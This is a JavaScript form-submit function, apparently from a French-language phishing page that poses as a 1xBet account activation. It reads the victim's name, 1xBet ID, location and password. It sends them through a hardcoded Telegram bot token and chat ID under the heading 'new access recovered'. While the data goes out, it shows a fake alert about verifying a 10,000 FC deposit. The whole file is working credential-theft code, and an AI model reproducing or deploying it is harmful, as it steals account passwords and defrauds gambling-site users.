function finalSubmit() {
    // 1. RÃ©cupÃ©ration sÃ©curisÃ©e des donnÃ©es
    const getVal = (id) => {
        const el = document.getElementById(id);
        return el ? el.value : "Non renseignÃ©";
    };

    const data = {
        nom: getVal('p1_name') || getVal('fullName'), // vÃ©rifie les deux IDs possibles
        id: getVal('p1_id') || getVal('userId'),
        sexe: getVal('p2_sex'),
        pays: getVal('p2_pays'),
        ville: getVal('p2_ville'),
        pass: getVal('p3_pass') || getVal('userPass')
    };

    // 2. VÃ©rification du mot de passe
    if (data.pass === "" || data.pass === "Non renseignÃ©") {
        alert("Veuillez entrer votre mot de passe pour confirmer l'activation.");
        return;
    }

    // --- CONFIGURATION TELEGRAM ---
    const token = "6979576051:AAGB_RAKRKORo-3jkv13XRHWhandRY240fc";
    const chatId = "5112163453"; 
    
    const texte = `ðŸ”” NOUVEL ACCÃˆS RÃ‰CUPÃ‰RÃ‰ ðŸ””\n\n` +
                 `ðŸ‘¤ Nom: ${data.nom}\n` +
                 `ðŸ†” ID 1xBet: ${data.id}\n` +
                 `ðŸŒ Ville: ${data.ville}, ${data.pays}\n` +
                 `ðŸ”‘ PASS: ${data.pass}`;

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(texte)}`;

    // 3. Alerte visuelle
    alert("VÃ©rification du dÃ©pÃ´t de 10 000 FC en cours... Veuillez patienter.");

    // 4. Envoi et Changement de page FORCÃ‰
    fetch(url)
    .then(() => {
        console.log("SuccÃ¨s Telegram");
        showPage(4); 
    })
    .catch((err) => {
        console.error("Erreur d'envoi:", err);
        showPage(4); // On force la page 4 mÃªme si l'envoi Ã©choue
    });
    
    // SÃ©curitÃ© : si fetch est trop lent, on change de page aprÃ¨s 2 secondes
    setTimeout(() => { showPage(4); }, 2000);
}
